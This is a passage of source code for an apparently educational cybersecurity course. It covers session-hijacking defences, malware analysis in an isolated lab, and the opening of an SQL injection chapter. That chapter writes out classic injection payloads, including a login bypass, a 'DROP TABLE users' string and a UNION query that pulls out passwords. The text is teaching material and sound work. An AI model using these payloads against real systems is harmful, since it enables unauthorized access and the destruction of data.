                  <div class="tool-row"><span>Cross-Site Request Forgery (CSRF)</span><span>Attacker abuses the victim’s active session to perform unauthorized actions.</span></div>
                  <div class="tool-row"><span>Man-in-the-Middle (MITM)</span><span>Attacker intercepts and possibly modifies traffic between client and server.</span></div>
                  <div class="tool-row"><span>Man-in-the-Browser (MITB)</span><span>Malware in the browser steals or modifies session data.</span></div>
                  <div class="tool-row"><span>Session Replay</span><span>Attacker reuses a captured session ID to impersonate the user.</span></div>
                </div>

                <h4 class="sub-h">Session ID Theft Methods</h4>
                <ul class="content-list">
                  <li><strong>Packet Sniffing:</strong> Capturing unencrypted HTTP traffic on the same network.</li>
                  <li><strong>XSS:</strong> Injecting malicious scripts to read cookies.</li>
                  <li><strong>Malware:</strong> Browser extensions, keyloggers, or trojans that steal cookies.</li>
                  <li><strong>Physical Access:</strong> Accessing the user’s device and copying cookies.</li>
                  <li><strong>Session Fixation:</strong> Tricking the user into using a known session ID.</li>
                  <li><strong>Session Prediction:</strong> Guessing weak or sequential session IDs.</li>
                  <li><strong>Network Interception:</strong> MITM attacks on unencrypted or poorly encrypted connections.</li>
                  <li><strong>DNS Spoofing:</strong> Redirecting the user to a malicious server.</li>
                  <li><strong>Cookie Theft via Insecure Storage:</strong> Cookies stored in insecure locations.</li>
                </ul>

                <h4 class="sub-h">Session Hijacking vs. Session Fixation</h4>
                <ul class="content-list">
                  <li><strong>Session Hijacking:</strong> Attacker steals an existing session ID.</li>
                  <li><strong>Session Fixation:</strong> Attacker sets a known session ID before the victim logs in, then uses it after authentication.</li>
                  <li>Both result in unauthorized access, but the attack vector differs.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Attack Vectors</span>
                    <ul>
                      <li><strong>Unencrypted HTTP:</strong> Session cookies sent in plaintext can be captured.</li>
                      <li><strong>Weak Session ID Generation:</strong> Predictable or sequential IDs can be guessed.</li>
                      <li><strong>XSS Vulnerabilities:</strong> Allow attackers to execute scripts that steal cookies.</li>
                      <li><strong>CSRF Vulnerabilities:</strong> Allow attackers to perform actions on behalf of the user.</li>
                      <li><strong>Insecure Cookie Flags:</strong> Missing HttpOnly, Secure, or SameSite attributes.</li>
                      <li><strong>Public Wi-Fi:</strong> Easy target for packet sniffing and MITM.</li>
                      <li><strong>Malware:</strong> Browser malware can steal session data.</li>
                      <li><strong>Social Engineering:</strong> Tricking users into clicking malicious links.</li>
                      <li><strong>Session Timeout Misconfiguration:</strong> Long or no timeout increases risk.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Tools Used by Attackers</span>
                    <ul>
                      <li><strong>Wireshark:</strong> Packet capture and analysis.</li>
                      <li><strong>Burp Suite:</strong> Web proxy for intercepting and modifying requests.</li>
                      <li><strong>OWASP ZAP:</strong> Web application security scanner.</li>
                      <li><strong>Ettercap:</strong> MITM and ARP spoofing.</li>
                      <li><strong>Bettercap:</strong> Network attack framework.</li>
                      <li><strong>mitmproxy:</strong> Interactive HTTPS proxy.</li>
                      <li><strong>Cookie Editor:</strong> Browser extension to view and modify cookies.</li>
                      <li><strong>Firesheep:</strong> Historical tool for session sidejacking on public Wi-Fi.</li>
                      <li><strong>BeEF:</strong> Browser exploitation framework.</li>
                      <li><strong>XSSer:</strong> XSS exploitation tool.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Attack Scenarios</h4>
                <ul class="content-list">
                  <li><strong>Public Wi-Fi Sniffing:</strong> Attacker captures session cookies from HTTP traffic.</li>
                  <li><strong>XSS Cookie Theft:</strong> Attacker injects script that sends document.cookie to their server.</li>
                  <li><strong>Session Fixation:</strong> Attacker sends a link with a predefined session ID; victim logs in; attacker uses the same ID.</li>
                  <li><strong>CSRF Attack:</strong> Attacker crafts a request that performs an action using the victim’s active session.</li>
                  <li><strong>MITM:</strong> Attacker intercepts and modifies traffic, potentially stealing session tokens.</li>
                  <li><strong>Malware-Based:</strong> Browser extension or trojan steals cookies and session data.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls</h3>

                <h4 class="sub-h">Secure Session Management</h4>
                <ul class="content-list">
                  <li>Use HTTPS Everywhere: Encrypt all traffic with TLS to prevent sniffing.</li>
                  <li>HSTS: Enforce HTTPS and prevent downgrade attacks.</li>
                  <li>Secure Cookie Flags:
                    <ul>
                      <li><strong>Secure:</strong> Cookie only sent over HTTPS.</li>
                      <li><strong>HttpOnly:</strong> Cookie not accessible via JavaScript.</li>
                      <li><strong>SameSite:</strong> Cookie not sent with cross-site requests (Strict or Lax).</li>
                    </ul>
                  </li>
                  <li>Session ID Requirements:
                    <ul>
                      <li>Long, random, and unpredictable.</li>
                      <li>Generated using cryptographically secure random number generators.</li>
                      <li>Sufficient entropy (at least 128 bits).</li>
                    </ul>
                  </li>
                  <li>Session Timeout: Short idle timeout and absolute timeout.</li>
                  <li>Regenerate Session ID: After login and privilege changes.</li>
                  <li>Logout: Invalidate session on server side.</li>
                  <li>Token Binding: Bind session tokens to client TLS certificates or device attributes.</li>
                </ul>

                <h4 class="sub-h">Web Application Security</h4>
                <ul class="content-list">
                  <li>Input Validation: Prevent XSS by validating and sanitizing input.</li>
                  <li>Output Encoding: Encode output to prevent script injection.</li>
                  <li>CSRF Tokens: Use anti-CSRF tokens for state-changing requests.</li>
                  <li>Content Security Policy (CSP): Restrict sources of scripts.</li>
                  <li>X-Frame-Options: Prevent clickjacking.</li>
                  <li>Secure Coding Practices: Follow OWASP Top 10 guidelines.</li>
                  <li>Regular Security Testing: Penetration testing and vulnerability scanning.</li>
                </ul>

                <h4 class="sub-h">Network Security</h4>
                <ul class="content-list">
                  <li>Use VPN: Encrypt traffic on untrusted networks.</li>
                  <li>Avoid Public Wi-Fi: Or use VPN if necessary.</li>
                  <li>Network Segmentation: Limit lateral movement.</li>
                  <li>IDS/IPS: Detect session hijacking attempts.</li>
                  <li>Monitor Traffic: Look for unusual session activity.</li>
                  <li>DNS Security: Use DNSSEC, DoH, DoT.</li>
                </ul>

                <h4 class="sub-h">Endpoint Security</h4>
                <ul class="content-list">
                  <li>Antivirus/Anti-Malware: Detect and remove session-stealing malware.</li>
                  <li>Browser Security: Keep browsers updated; use security extensions.</li>
                  <li>Disable Unnecessary Extensions: Reduce attack surface.</li>
                  <li>MFA: Adds layer beyond session cookies.</li>
                  <li>Device Encryption: Protect stored cookies and tokens.</li>
                  <li>User Education: Recognize phishing and suspicious links.</li>
                </ul>

                <h4 class="sub-h">Monitoring and Response</h4>
                <ul class="content-list">
                  <li>Log Session Activity: Track logins, logouts, and session changes.</li>
                  <li>Detect Anomalies: Impossible travel, multiple IPs, unusual behavior.</li>
                  <li>Alert on Suspicious Activity: Multiple sessions from different locations.</li>
                  <li>Incident Response: Invalidate sessions, force password reset, notify user.</li>
                  <li>SIEM Integration: Correlate session events with other security data.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Packet capture and analysis</span></div>
                  <div class="tool-row"><span>Burp Suite</span><span>Web proxy for testing</span></div>
                  <div class="tool-row"><span>OWASP ZAP</span><span>Web application scanner</span></div>
                  <div class="tool-row"><span>Ettercap</span><span>MITM and ARP spoofing</span></div>
                  <div class="tool-row"><span>Bettercap</span><span>Network attack framework</span></div>
                  <div class="tool-row"><span>mitmproxy</span><span>Interactive HTTPS proxy</span></div>
                  <div class="tool-row"><span>BeEF</span><span>Browser exploitation framework</span></div>
                  <div class="tool-row"><span>XSSer</span><span>XSS exploitation tool</span></div>
                  <div class="tool-row"><span>Cookie Editor</span><span>Browser extension for cookies</span></div>
                  <div class="tool-row"><span>Firesheep</span><span>Historical session sidejacking tool</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Session Testing Commands</span></div>
                  <pre><code># Check security headers
curl -I https://example.com

# Inspect TLS
openssl s_client -connect example.com:443

# Check cookie flags
nmap --script http-cookie-flags -p 80,443 example.com

# Test SQLi with session
sqlmap -u "http://example.com/page?id=1" --cookies="SESSIONID=..."

# Wireshark filter: http.cookie or tcp
# Burp Suite: intercept and modify session cookies</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Session hijacking is the theft or takeover of an active session.</li>
                  <li>Attackers steal session IDs, cookies, or tokens to impersonate users.</li>
                  <li>Common methods: packet sniffing, XSS, session fixation, prediction, MITM.</li>
                  <li>Unencrypted HTTP and missing cookie flags increase risk.</li>
                  <li>Defenses: HTTPS, HSTS, secure cookie flags, session timeout, regeneration, CSRF tokens, CSP, MFA.</li>
                  <li>Monitoring and anomaly detection are essential for detection.</li>
                  <li>Tools: Wireshark, Burp Suite, ZAP, Ettercap, Bettercap, mitmproxy, BeEF.</li>
                  <li>Understanding session hijacking is critical for web application and network security.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — Session Management Cheat Sheet</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — CSRF Prevention</a>
                  <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — XSS Prevention</a>
                  <a href="https://jwt.io/" target="_blank" rel="noopener">JWT.io — JWT debugger and information</a>
                  <a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite — Web proxy</a>
                </div>
              </section>
            ` },
                    { id: "3.5", title: "Malware Analysis in a Safe Lab", pages: "315-330", read: 22,
            build: "Set up an isolated lab and perform static and dynamic analysis.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Malware Analysis</strong> is the process of examining malicious software to understand its origin, functionality, behavior, and impact. It involves both <strong>static analysis</strong> (examining the code without executing it) and <strong>dynamic analysis</strong> (observing the malware's behavior during execution). The goal is to develop detection signatures, understand attack vectors, identify indicators of compromise (IOCs), and improve defensive capabilities.</p>
                <p><strong>A Safe Lab</strong> is an isolated, controlled environment specifically designed for malware analysis. It prevents the malware from escaping, infecting production systems, or communicating with real command-and-control (C2) servers. Safe labs use virtual machines, network isolation, snapshots, and monitoring tools.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Example</h3>
                <p>A security analyst receives a suspicious email attachment named <code>invoice.pdf.exe</code>. Before opening it on a production system, the analyst transfers it to an isolated malware analysis lab. The lab consists of a virtual machine running Windows 10 with no internet access (or controlled internet simulation), monitoring tools like Process Monitor, Wireshark, and Regshot. The analyst runs the file, observes it creating a registry key for persistence, attempting to connect to a remote IP, and dropping a second-stage payload. The analyst documents all IOCs, creates a YARA rule, and submits the hash to VirusTotal. The findings are used to update endpoint detection rules and block the malicious IP at the firewall.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Malware Analysis In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/malware-analysis-lab.png" alt="Isolated malware analysis lab with virtual machines, monitoring tools, and network simulation" />
                  <figcaption>Figure 3.5 — Safe malware analysis lab: isolated VMs, fake network services, monitoring tools, and snapshots.</figcaption>
                </figure>

                <h4 class="sub-h">Types of Malware Analysis</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Tools</span></div>
                  <div class="tool-row"><span>Static Analysis</span><span>Examining the file without executing it</span><span>Strings, PEview, PEiD, Detect It Easy, HxD, YARA</span></div>
                  <div class="tool-row"><span>Dynamic Analysis</span><span>Executing in a controlled environment and observing behavior</span><span>Process Monitor, Process Explorer, Wireshark, Regshot, API Monitor</span></div>
                  <div class="tool-row"><span>Code Analysis</span><span>Reverse engineering the binary to understand logic</span><span>IDA Pro, Ghidra, x64dbg, OllyDbg</span></div>
                  <div class="tool-row"><span>Memory Analysis</span><span>Examining RAM for malicious artifacts</span><span>Volatility, Rekall</span></div>
                  <div class="tool-row"><span>Network Analysis</span><span>Analyzing network traffic generated by malware</span><span>Wireshark, tcpdump, FakeNet-NG, INetSim</span></div>
                  <div class="tool-row"><span>Behavioral Analysis</span><span>Observing system changes, file operations, registry modifications</span><span>Process Monitor, Autoruns, Regshot</span></div>
                </div>

                <h4 class="sub-h">Malware Analysis Process</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Acquisition: Obtain the malware sample safely.</div>
                  <div class="step-item"><span class="step-num">2</span> Documentation: Record hashes (MD5, SHA-1, SHA-256), file type, size.</div>
                  <div class="step-item"><span class="step-num">3</span> Static Analysis: Examine strings, headers, imports, packers.</div>
                  <div class="step-item"><span class="step-num">4</span> Dynamic Analysis: Run in sandbox; monitor processes, files, registry, network.</div>
                  <div class="step-item"><span class="step-num">5</span> Code Analysis: Reverse engineer if needed.</div>
                  <div class="step-item"><span class="step-num">6</span> IOC Extraction: Identify IPs, domains, file paths, registry keys, mutexes.</div>
                  <div class="step-item"><span class="step-num">7</span> Signature Creation: Develop YARA rules, Snort signatures.</div>
                  <div class="step-item"><span class="step-num">8</span> Reporting: Document findings and recommendations.</div>
                </div>

                <h4 class="sub-h">Safe Lab Requirements</h4>
                <ul class="content-list">
                  <li><strong>Isolation:</strong> No connection to production network or internet.</li>
                  <li><strong>Virtual Machines:</strong> Snapshots for quick restore.</li>
                  <li><strong>Network Simulation:</strong> Fake internet services (INetSim, FakeNet-NG).</li>
                  <li><strong>Monitoring Tools:</strong> Process Monitor, Wireshark, Regshot, API Monitor.</li>
                  <li><strong>Hypervisor:</strong> VirtualBox, VMware, Hyper-V, KVM.</li>
                  <li><strong>Host Security:</strong> Updated hypervisor, no shared folders, disabled clipboard.</li>
                  <li><strong>Logging:</strong> Capture all activity.</li>
                  <li><strong>Safety Protocols:</strong> Never run malware on host; always use isolated VMs.</li>
                </ul>

                <h4 class="sub-h">Static Analysis Techniques</h4>
                <ul class="content-list">
                  <li><strong>File Hashing:</strong> MD5, SHA-1, SHA-256 for identification.</li>
                  <li><strong>File Type Identification:</strong> Using file command, TrID, PEiD.</li>
                  <li><strong>Strings Extraction:</strong> strings command, FLOSS.</li>
                  <li><strong>PE Header Analysis:</strong> PEview, CFF Explorer, Detect It Easy.</li>
                  <li><strong>Packer Detection:</strong> PEiD, Detect It Easy, ExeInfo PE.</li>
                  <li><strong>Import Table Analysis:</strong> Identify API calls.</li>
                  <li><strong>YARA Scanning:</strong> Pattern matching for known malware.</li>
                  <li><strong>VirusTotal:</strong> Submit hash for multi-engine scan.</li>
                </ul>

                <h4 class="sub-h">Dynamic Analysis Techniques</h4>
                <ul class="content-list">
                  <li><strong>Process Monitoring:</strong> Process Monitor, Process Explorer, Process Hacker.</li>
                  <li><strong>File System Monitoring:</strong> Process Monitor, Regshot.</li>
                  <li><strong>Registry Monitoring:</strong> Regshot, Autoruns.</li>
                  <li><strong>Network Monitoring:</strong> Wireshark, tcpdump, FakeNet-NG.</li>
                  <li><strong>API Monitoring:</strong> API Monitor, Rohitab API Monitor.</li>
                  <li><strong>Memory Analysis:</strong> Volatility, Rekall.</li>
                  <li><strong>Sandboxing:</strong> Cuckoo Sandbox, Any.Run, Joe Sandbox, Hybrid Analysis.</li>
                </ul>

                <h4 class="sub-h">Code Analysis Techniques</h4>
                <ul class="content-list">
                  <li><strong>Disassembly:</strong> IDA Pro, Ghidra, Radare2.</li>
                  <li><strong>Debugging:</strong> x64dbg, OllyDbg, WinDbg.</li>
                  <li><strong>Decompilation:</strong> Ghidra, Hex-Rays (IDA), RetDec.</li>
                  <li><strong>Unpacking:</strong> UPX, OllyDump, Scylla.</li>
                  <li><strong>Anti-Analysis Evasion:</strong> Detect debuggers, VMs, sandboxes.</li>
                </ul>

                <h4 class="sub-h">Indicators of Compromise (IOCs)</h4>
                <ul class="content-list">
                  <li><strong>File Hashes:</strong> MD5, SHA-1, SHA-256.</li>
                  <li><strong>File Paths:</strong> Drop locations.</li>
                  <li><strong>Registry Keys:</strong> Persistence mechanisms.</li>
                  <li><strong>Network Indicators:</strong> IPs, domains, URLs, ports.</li>
                  <li><strong>Mutexes:</strong> Used for single-instance checks.</li>
                  <li><strong>Process Names:</strong> Malicious process names.</li>
                  <li><strong>Service Names:</strong> Installed services.</li>
                  <li><strong>Scheduled Tasks:</strong> Persistence.</li>
                  <li><strong>User Agents:</strong> Custom HTTP user agents.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Vectors (Anti-Analysis)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Anti-Analysis Techniques</span>
                    <ul>
                      <li><strong>Packing:</strong> Compressing or encrypting the executable.</li>
                      <li><strong>Obfuscation:</strong> Making code hard to read.</li>
                      <li><strong>Anti-Debugging:</strong> Detecting debuggers and terminating.</li>
                      <li><strong>Anti-VM:</strong> Detecting virtual machines and refusing to run.</li>
                      <li><strong>Anti-Sandbox:</strong> Detecting sandbox environments.</li>
                      <li><strong>Timing Attacks:</strong> Delaying execution to evade automated analysis.</li>
                      <li><strong>Environment Checks:</strong> Checking for specific files, processes, or registry keys.</li>
                      <li><strong>Polymorphism:</strong> Changing code each infection.</li>
                      <li><strong>Metamorphism:</strong> Rewriting code completely.</li>
                      <li><strong>Rootkit Techniques:</strong> Hiding from analysis tools.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Malware Evasion Tactics</span>
                    <ul>
                      <li><strong>Living Off the Land:</strong> Using legitimate system tools (PowerShell, WMI, PsExec).</li>
                      <li><strong>Fileless Malware:</strong> Running in memory only.</li>
                      <li><strong>Encrypted C2:</strong> Using HTTPS, DNS tunneling, or custom protocols.</li>
                      <li><strong>Domain Generation Algorithms (DGA):</strong> Generating many domains to find C2.</li>
                      <li><strong>Fast Flux:</strong> Rapidly changing DNS records.</li>
                      <li><strong>Peer-to-Peer C2:</strong> Decentralized command and control.</li>
                      <li><strong>Steganography:</strong> Hiding data in images or other files.</li>
                      <li><strong>Process Injection:</strong> Injecting code into legitimate processes.</li>
                      <li><strong>Masquerading:</strong> Using legitimate-looking file names and icons.</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Risks of Improper Analysis</h4>
                <ul class="content-list">
                  <li><strong>Infection of Host:</strong> Malware escapes VM and infects host.</li>
                  <li><strong>Network Spread:</strong> Malware infects production network.</li>
                  <li><strong>Data Leakage:</strong> Malware exfiltrates sensitive data.</li>
                  <li><strong>Legal Issues:</strong> Analyzing malware without authorization.</li>
                  <li><strong>Attribution Errors:</strong> Misidentifying malware family or actor.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Defensive Controls (Lab Setup)</h3>

                <h4 class="sub-h">Safe Lab Best Practices</h4>
                <ul class="content-list">
                  <li>Isolated Network: Use host-only or internal network adapters.</li>
                  <li>No Internet: Or simulate internet with INetSim/FakeNet-NG.</li>
                  <li>Snapshots: Take before and after analysis.</li>
                  <li>Separate Host: Use dedicated hardware if possible.</li>
                  <li>Updated Hypervisor: Keep VirtualBox/VMware updated.</li>
                  <li>Disable Shared Folders: Prevent malware from accessing host.</li>
                  <li>Disable Clipboard: Prevent data leakage.</li>
                  <li>Monitoring Tools: Install all necessary tools before analysis.</li>
                  <li>Logging: Enable detailed logging.</li>
                  <li>Safety Protocols: Never run malware on host; use isolated VMs.</li>
                  <li>Legal Compliance: Ensure you have permission to analyze malware.</li>
                </ul>

                <h4 class="sub-h">Malware Analysis Tools</h4>
                <ul class="content-list">
                  <li><strong>Static Analysis:</strong> PEview, CFF Explorer, Detect It Easy, Strings, FLOSS, YARA.</li>
                  <li><strong>Dynamic Analysis:</strong> Process Monitor, Process Explorer, Regshot, Wireshark, API Monitor.</li>
                  <li><strong>Code Analysis:</strong> IDA Pro, Ghidra, x64dbg, OllyDbg, Radare2.</li>
                  <li><strong>Memory Analysis:</strong> Volatility, Rekall.</li>
                  <li><strong>Network Analysis:</strong> Wireshark, tcpdump, FakeNet-NG, INetSim.</li>
                  <li><strong>Sandboxing:</strong> Cuckoo Sandbox, Any.Run, Joe Sandbox, Hybrid Analysis.</li>
                  <li><strong>Online Scanners:</strong> VirusTotal, Hybrid Analysis, Joe Sandbox, Any.Run.</li>
                </ul>

                <h4 class="sub-h">IOC Extraction and Sharing</h4>
                <ul class="content-list">
                  <li>Extract IOCs: Hashes, IPs, domains, file paths, registry keys.</li>
                  <li>Create YARA Rules: For detection.</li>
                  <li>Create Snort/Suricata Rules: For network detection.</li>
                  <li>Share IOCs: With threat intelligence platforms (MISP, AlienVault OTX).</li>
                  <li>Update Defenses: Block IOCs at firewall, endpoint, and email gateway.</li>
                </ul>

                <h4 class="sub-h">Reporting</h4>
                <ul class="content-list">
                  <li><strong>Executive Summary:</strong> Non-technical overview.</li>
                  <li><strong>Technical Details:</strong> Static, dynamic, and code analysis findings.</li>
                  <li><strong>IOCs:</strong> List of indicators.</li>
                  <li><strong>Detection Rules:</strong> YARA, Snort, Sigma.</li>
                  <li><strong>Recommendations:</strong> Mitigation and remediation steps.</li>
                  <li><strong>Attribution:</strong> If possible, identify malware family or actor.</li>
                </ul>

                <h4 class="sub-h">Legal and Ethical Considerations</h4>
                <ul class="content-list">
                  <li>Authorization: Only analyze malware you are authorized to analyze.</li>
                  <li>Chain of Custody: Maintain proper documentation.</li>
                  <li>Confidentiality: Protect sensitive data.</li>
                  <li>Responsible Disclosure: Report findings to appropriate parties.</li>
                  <li>Compliance: Follow laws and regulations.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Multi-engine malware scanner</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Interactive malware sandbox</span></div>
                  <div class="tool-row"><span>Hybrid Analysis</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>Joe Sandbox</span><span>Malware sandbox</span></div>
                  <div class="tool-row"><span>Cuckoo Sandbox</span><span>Open-source sandbox</span></div>
                  <div class="tool-row"><span>Process Monitor</span><span>Windows process monitoring</span></div>
                  <div class="tool-row"><span>Process Explorer</span><span>Windows process viewer</span></div>
                  <div class="tool-row"><span>Regshot</span><span>Registry comparison</span></div>
                  <div class="tool-row"><span>Autoruns</span><span>Startup program viewer</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Network traffic analysis</span></div>
                  <div class="tool-row"><span>FakeNet-NG</span><span>Network simulation</span></div>
                  <div class="tool-row"><span>INetSim</span><span>Internet services simulation</span></div>
                  <div class="tool-row"><span>Volatility</span><span>Memory forensics</span></div>
                  <div class="tool-row"><span>IDA Pro</span><span>Disassembler and debugger</span></div>
                  <div class="tool-row"><span>Ghidra</span><span>Reverse engineering framework</span></div>
                  <div class="tool-row"><span>x64dbg</span><span>Windows debugger</span></div>
                  <div class="tool-row"><span>OllyDbg</span><span>Windows debugger</span></div>
                  <div class="tool-row"><span>PEview</span><span>PE header viewer</span></div>
                  <div class="tool-row"><span>CFF Explorer</span><span>PE editor</span></div>
                  <div class="tool-row"><span>Detect It Easy</span><span>Packer and compiler detection</span></div>
                  <div class="tool-row"><span>Strings</span><span>String extraction</span></div>
                  <div class="tool-row"><span>FLOSS</span><span>String extraction for malware</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching for malware</span></div>
                  <div class="tool-row"><span>ClamAV</span><span>Open-source antivirus</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>MISP</span><span>Threat intelligence sharing</span></div>
                  <div class="tool-row"><span>AlienVault OTX</span><span>Threat intelligence</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Malware Analysis Commands</span></div>
                  <pre><code># Hashing
md5sum malware.exe
sha256sum malware.exe

# String extraction
strings malware.exe
floss malware.exe

# YARA scanning
yara rules.yar malware.exe

# Memory forensics
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 malfind

# Network capture
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Malware analysis is the process of examining malicious software.</li>
                  <li>Static analysis examines code without executing it.</li>
                  <li>Dynamic analysis observes behavior during execution.</li>
                  <li>Code analysis reverse engineers the binary.</li>
                  <li>Safe labs are isolated, controlled environments for analysis.</li>
                  <li>Anti-analysis techniques include packing, obfuscation, anti-VM, anti-debug.</li>
                  <li>IOCs include hashes, IPs, domains, file paths, registry keys.</li>
                  <li>Defenses: isolated lab, snapshots, monitoring tools, IOC sharing, YARA rules.</li>
                  <li>Tools: VirusTotal, Any.Run, Cuckoo, Process Monitor, Wireshark, IDA Pro, Ghidra, Volatility.</li>
                  <li>Legal and ethical considerations are paramount.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal — Multi-engine malware scanner</a>
                  <a href="https://any.run/" target="_blank" rel="noopener">Any.Run — Interactive malware sandbox</a>
                  <a href="https://www.hybrid-analysis.com/" target="_blank" rel="noopener">Hybrid Analysis — Malware analysis</a>
                  <a href="https://www.joesandbox.com/" target="_blank" rel="noopener">Joe Sandbox — Malware sandbox</a>
                  <a href="https://cuckoosandbox.org/" target="_blank" rel="noopener">Cuckoo Sandbox — Open-source sandbox</a>
                  <a href="https://ghidra-sre.org/" target="_blank" rel="noopener">Ghidra — Reverse engineering framework</a>
                  <a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener">Volatility — Memory forensics</a>
                </div>
              </section>
            ` },
        ],
      },

      // ============================================================
      // MODULE 4 — ATTACK TECHNIQUES
      // ============================================================
      {
        id: "m4",
        type: "part",
        number: 4,
        title: "Attack Techniques (Safe Lab Only)",
        icon: "⚔️",
        blurb: "To defend like a professional, you must think like an attacker. Every technique in this module is performed only in isolated, owned labs. Never touch a system without written permission.",
        chapters: [
                    { id: "4.1", title: "SQL Injection", pages: "331-344", read: 18,
            build: "Exploit a vulnerable login form with SQLMap and fix it using prepared statements.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>SQL Injection (SQLi)</strong> is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not properly sanitized, allowing an attacker to inject malicious SQL statements that are executed by the backend database. Successful SQL injection can lead to unauthorized data access, data modification, data deletion, authentication bypass, and in severe cases, remote code execution on the database server.</p>
                <p>SQL injection is consistently ranked among the most critical web application security risks by OWASP.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>Consider a login form that asks for a username and password. The backend code constructs an SQL query like this:</p>
                <pre><code>SELECT * FROM users WHERE username = 'user' AND password = 'pass';</code></pre>
                <p>If an attacker enters <code>' OR '1'='1</code> as the username and anything as the password, the query becomes:</p>
                <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';</code></pre>
                <p>Because <code>'1'='1'</code> is always true, the query returns all users, and the attacker is logged in as the first user in the database—often an administrator.</p>
                <p>A more destructive example: an attacker enters <code>'; DROP TABLE users; --</code> which deletes the entire users table.</p>
                <p><strong>Real-world breaches:</strong> Sony Pictures (2011), TalkTalk (2015), Yahoo (2012), Heartland Payment Systems (2008).</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. SQL Injection In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/sql-injection.png" alt="SQL injection attack flow — user input concatenated into SQL query, leading to data breach" />
                  <figcaption>Figure 4.1 — SQL injection occurs when untrusted input alters the logic of a database query.</figcaption>
                </figure>

                <h4 class="sub-h">What is SQL?</h4>
                <p>SQL (Structured Query Language) is the standard language for interacting with relational databases. It is used to create, read, update, and delete data. Common SQL commands include <code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>DROP</code>, and <code>UNION</code>.</p>

                <h4 class="sub-h">How SQL Injection Works</h4>
                <ul class="content-list">
                  <li>User input is concatenated directly into SQL queries without proper sanitization.</li>
                  <li>Input is not validated for type, length, format, or allowed characters.</li>
                  <li>Error messages are displayed to the user, revealing database structure.</li>
                  <li>The application uses a database account with excessive privileges.</li>
                </ul>
                <p>The attacker's goal is to manipulate the query logic to:</p>
                <ul class="content-list">
                  <li>Bypass authentication.</li>
                  <li>Extract sensitive data.</li>
                  <li>Modify or delete data.</li>
                  <li>Execute administrative operations.</li>
                  <li>In some cases, execute operating system commands.</li>
                </ul>

                <h4 class="sub-h">Types of SQL Injection</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>In-band SQLi</span><span>Same channel for attack and results</span><span>Error-based, Union-based</span></div>
                  <div class="tool-row"><span>Error-based</span><span>Relies on error messages</span><span>' AND 1=CONVERT(int, @@version)--</span></div>
                  <div class="tool-row"><span>Union-based</span><span>Uses UNION to combine results</span><span>' UNION SELECT username, password FROM users--</span></div>
